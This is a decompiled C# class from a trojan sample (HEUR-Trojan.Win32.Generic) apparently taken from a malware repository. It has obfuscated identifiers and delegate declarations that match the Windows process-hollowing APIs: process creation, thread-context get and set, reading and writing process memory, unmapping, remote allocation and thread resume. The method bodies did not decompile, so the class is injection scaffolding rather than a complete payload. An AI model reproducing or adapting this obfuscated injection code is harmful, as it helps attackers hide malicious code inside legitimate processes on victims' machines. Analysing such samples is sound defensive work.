// Decompiled with JetBrains decompiler
// Type: ClassLibrary1.IllogicalCallContext.GetAssemblyEnumerator
// Assembly: ClassLibrary1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BD89B5FB-ADA3-4778-A6F3-2882B72918D5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-0dfff5bbf6b08a68798117e7f9126d0fd9715dc6cd2b40a4e027d54f911ad0aa.exe

using System;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
  public class IllogicalCallContext\u002EGetAssemblyEnumerator
  {
    public static int \u003131;
    internal static Ⴐ \u003131;
    internal static char[] \u003131;

    public static bool gUTJUaEM([In] byte[] obj0, [In] string obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    static string \u00322(double _param0, int _param1, int _param2, int _param3)
    {
      // ISSUE: unable to decompile the method.
    }

    [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Unicode, SetLastError = true)]
    internal delegate int IResourceTableMappingEntry\u002EGetType(
      string applicationName,
      string commandLine,
      IntPtr processAttributes,
      IntPtr threadAttributes,
      bool inheritHandles,
      uint creationFlags,
      IntPtr environment,
      string currentDirectory,
      ref XmlSyntaxException\u002Eget_NeedsReflectionSecurityCheck.SynchronizationContextTaskScheduler\u002Eget_ExternalClaims startupInfo,
      ref XmlSyntaxException\u002Eget_NeedsReflectionSecurityCheck.ICOMServerEntry\u002EValidateParseStyleFloatingPoint processInformation);

    internal delegate int PropertyAnalysis\u002ERegConnectRegistry(uint hThread, uint[] lpContext);

    internal delegate uint MethodBase\u002EDeny(IntPtr thread, uint[] context);

    internal delegate int NullStreamReader\u002ESystem\u002ECollections\u002EGeneric\u002EIList\u003CT\u003E\u002Eget_Item(
      int process,
      int baseAddress,
      byte[] buffer,
      int bufferSize,
      out int bytesWritten);

    internal delegate bool DSAParameters\u002EEnsureLockObjectCreated(
      int process,
      int baseAddress,
      ref int buffer,
      int bufferSize,
      ref int bytesRead);

    internal delegate int MD5\u002Eget_RealErrorObject(int processHandle, int baseAddress);

    internal delegate int UInt32\u002EGetVarIndexOfMemId(
      int hProcess,
      int lpAddress,
      int dwSize,
      int flAllocationType,
      int flProtect);

    internal delegate int SafeKeyHandle\u002EFlipRememberedStack(IntPtr threadHandle);
  }
}
